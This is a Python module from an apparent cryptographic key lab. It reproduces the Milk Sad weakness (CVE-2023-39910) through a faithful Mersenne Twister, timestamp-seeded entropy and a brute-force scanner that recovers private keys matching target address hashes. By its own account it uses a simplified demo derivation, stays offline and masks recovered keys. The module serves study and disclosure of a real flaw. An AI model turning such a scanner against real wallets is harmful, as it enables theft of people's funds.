"""Milk Sad (CVE-2023-39910) — faithful MT19937 and timestamp-seeded weak keys.

Libbitcoin Explorer's ``bx seed`` (versions 3.0.0–3.6.0) drew wallet entropy from
a 32-bit Mersenne Twister (``std::mt19937``) seeded from the system clock. Whatever
bit-length the user asked for, the real entropy was only the 32-bit seed, so every
key it produced lives in a space of at most 2**32 candidates — brute-forceable. This
is the "Milk Sad" issue; it was exploited in the wild in mid-2023.

This module demonstrates that weakness with two pieces:

* :class:`MT19937` — a **faithful** 32-bit Mersenne Twister (the ``mt19937ar``
  reference, identical to C++ ``std::mt19937``). Its correctness is pinned by the
  C++ standard's published vector: default-seeded (5489), the 10,000th output is
  ``4123659995`` (checked in the tests).

* :func:`milksad_entropy` / :func:`scan_timestamp_range` — reconstruct ``bx seed``'s
  entropy fill from a 32-bit seed and search a bounded range of candidate seeds for
  one that produces a caller-supplied target address (HASH160), forward-verified.

**Honesty note.** The MT19937 core is verified exactly. The *entropy fill* models
libbitcoin's ``pseudo_random::fill`` as built against libstdc++ — a byte is
``uniform_int_distribution<uint16_t>(0, 255)`` over the generator, which that
library implements by down-scaling (``byte = mt() // 0xFFFFFF`` with rejection of
the top 256 outputs). No published Milk Sad vector was available to pin the exact
``seed → mnemonic`` mapping for a specific binary, so the key derivation here is a
**faithful-construction demo**, not a confirmed match to a disclosed wallet. It
derives a scalar straight from the entropy bytes rather than reproducing a full
BIP-39 → BIP-32 wallet path. Offline and bounded; no balance or network lookups,
and the recovered scalar is masked unless explicitly revealed. See ``SECURITY.md``.
"""

from __future__ import annotations

from collections.abc import Iterable
from dataclasses import dataclass

from keylab.ec.sec1 import serialize_sec1
from keylab.ec.secp256k1 import G, N, scalar_mult
from keylab.encoding.address import hash160

_UINT32_MASK = 0xFFFFFFFF
_N_WORDS = 624
_MIDDLE = 397
_MATRIX_A = 0x9908B0DF
_UPPER_MASK = 0x80000000
_LOWER_MASK = 0x7FFFFFFF
_DEFAULT_SEED = 5489  # std::mt19937 / mt19937ar default seed.

# libstdc++ uniform_int_distribution<uint16_t>(0, 255) over a 32-bit generator:
# scaling = (2**32 - 1) // 256, reject outputs >= 256 * scaling, byte = out // scaling.
_BYTE_SCALING = _UINT32_MASK // 256  # 0xFFFFFF
_BYTE_REJECT = 256 * _BYTE_SCALING  # 0xFFFFFF00


class MT19937:
    """Faithful 32-bit Mersenne Twister (``mt19937ar`` / C++ ``std::mt19937``).

    Seeding follows ``init_genrand``:
    ``mt[0] = seed`` and ``mt[i] = 1812433253 * (mt[i-1] ^ (mt[i-1] >> 30)) + i``,
    all modulo 2**32. Correctness is pinned by the C++ standard vector: default
    seed 5489, the 10,000th output is ``4123659995``.
    """

    __slots__ = ("_index", "_mt")

    def __init__(self, seed: int = _DEFAULT_SEED) -> None:
        self._mt: list[int] = [0] * _N_WORDS
        self._index = _N_WORDS
        self.seed(seed)

    def seed(self, seed: int) -> None:
        """Re-key the generator with ``init_genrand`` (``seed`` masked to 32 bits)."""
        if type(seed) is not int or seed < 0:
            raise ValueError("seed must be a non-negative integer")
        mt = self._mt
        mt[0] = seed & _UINT32_MASK
        for i in range(1, _N_WORDS):
            prev = mt[i - 1]
            mt[i] = (1812433253 * (prev ^ (prev >> 30)) + i) & _UINT32_MASK
        self._index = _N_WORDS

    def _twist(self) -> None:
        mt = self._mt
        for i in range(_N_WORDS):
            y = (mt[i] & _UPPER_MASK) | (mt[(i + 1) % _N_WORDS] & _LOWER_MASK)
            value = mt[(i + _MIDDLE) % _N_WORDS] ^ (y >> 1)
            if y & 1:
                value ^= _MATRIX_A
            mt[i] = value
        self._index = 0

    def next_uint32(self) -> int:
        """Return the next tempered 32-bit output."""
        if self._index >= _N_WORDS:
            self._twist()
        y = self._mt[self._index]
        self._index += 1
        y ^= y >> 11
        y ^= (y << 7) & 0x9D2C5680
        y ^= (y << 15) & 0xEFC60000
        y ^= y >> 18
        return y & _UINT32_MASK

    def next_byte(self) -> int:
        """Return one entropy byte, modelling libstdc++ ``uniform_int<uint16_t>(0, 255)``."""
        while True:
            value = self.next_uint32()
            if value < _BYTE_REJECT:
                return value // _BYTE_SCALING

    def fill(self, length: int) -> bytes:
        """Return ``length`` entropy bytes (``pseudo_random::fill`` semantics)."""
        if type(length) is not int or length < 0:
            raise ValueError("length must be a non-negative integer")
        return bytes(self.next_byte() for _ in range(length))


def milksad_entropy(seed: int, length: int = 32) -> bytes:
    """Reconstruct ``bx seed`` entropy: MT19937 seeded with ``seed``, ``length`` bytes."""
    if type(length) is not int or length < 1:
        raise ValueError("length must be a positive integer")
    return MT19937(seed).fill(length)


def _derive(seed: int, length: int, *, compressed: bool) -> tuple[bytes, int, bytes, bytes] | None:
    """Return ``(entropy, scalar, pubkey, hash160)`` for a seed, or ``None`` if invalid.

    The scalar is ``int(entropy) mod N``; a 0 result (astronomically unlikely) is
    skipped. This is the faithful-construction demo mapping, not a BIP-39 wallet path.
    """
    entropy = milksad_entropy(seed, length)
    scalar = int.from_bytes(entropy, "big") % N
    if scalar == 0:
        return None
    pubkey = serialize_sec1(scalar_mult(scalar, G), compressed=compressed)
    return entropy, scalar, pubkey, hash160(pubkey)


def milksad_key_from_timestamp(timestamp: int, *, entropy_bytes: int = 32) -> int:
    """Return the demo private scalar for a 32-bit ``timestamp`` seed.

    Scalar is ``int(entropy) mod N`` over :func:`milksad_entropy`. This reproduces the
    *weakness* (a 32-bit-seeded key), not a specific disclosed wallet's derivation.
    """
    if type(timestamp) is not int or timestamp < 0:
        raise ValueError("timestamp must be a non-negative integer")
    derived = _derive(timestamp, entropy_bytes, compressed=True)
    if derived is None:
        raise ValueError("seed derives the zero scalar; pick another")
    return derived[1]


@dataclass(frozen=True)
class MilksadHit:
    """A timestamp seed whose derived key matches a target HASH160 (key masked)."""

    timestamp: int
    entropy: bytes
    private_key: int
    pubkey: bytes
    hash160: bytes

    def to_dict(self, *, reveal_private: bool = False) -> dict[str, object]:
        """Serialise the hit; the private key is redacted unless ``reveal_private``."""
        return {
            "timestamp": self.timestamp,
            "entropy": self.entropy.hex(),
            "pubkey": self.pubkey.hex(),
            "hash160": self.hash160.hex(),
            "private_key": format(self.private_key, "064x") if reveal_private else "<redacted>",
        }


def _coerce_targets(targets: Iterable[bytes]) -> frozenset[bytes]:
    coerced: set[bytes] = set()
    for target in targets:
        if not isinstance(target, (bytes, bytearray)) or len(target) != 20:
            raise ValueError("each target must be a 20-byte HASH160")
        coerced.add(bytes(target))
    if not coerced:
        raise ValueError("at least one target HASH160 is required")
    return frozenset(coerced)


def scan_timestamp_range(
    start_seed: int,
    end_seed: int,
    targets: Iterable[bytes],
    *,
    entropy_bytes: int = 32,
    compressed: bool = True,
) -> list[MilksadHit]:
    """Scan ``[start_seed, end_seed)`` for seeds deriving any target HASH160.

    Each candidate seed is expanded to entropy, reduced to a scalar, turned into a
    public key and HASH160, and compared against ``targets`` (forward-verified by
    construction). Offline and bounded by the seed window; no network or balance
    lookups. Recovered keys are carried on :class:`MilksadHit` and masked by default.
    """
    if type(start_seed) is not int or start_seed < 0:
        raise ValueError("start_seed must be a non-negative integer")
    if type(end_seed) is not int or end_seed < start_seed:
        raise ValueError("end_seed must be an integer >= start_seed")
    if type(entropy_bytes) is not int or entropy_bytes < 1:
        raise ValueError("entropy_bytes must be a positive integer")
    target_set = _coerce_targets(targets)

    hits: list[MilksadHit] = []
    for seed in range(start_seed, end_seed):
        derived = _derive(seed, entropy_bytes, compressed=compressed)
        if derived is None:
            continue
        entropy, scalar, pubkey, h160 = derived
        if h160 in target_set:
            hits.append(MilksadHit(seed, entropy, scalar, pubkey, h160))
    return hits


def milksad_hash160(seed: int, *, entropy_bytes: int = 32, compressed: bool = True) -> bytes:
    """Return the HASH160 of the demo public key for ``seed`` (for building targets)."""
    derived = _derive(seed, entropy_bytes, compressed=compressed)
    if derived is None:
        raise ValueError("seed derives the zero scalar; pick another")
    return derived[3]


__all__ = [
    "MT19937",
    "MilksadHit",
    "milksad_entropy",
    "milksad_hash160",
    "milksad_key_from_timestamp",
    "scan_timestamp_range",
]
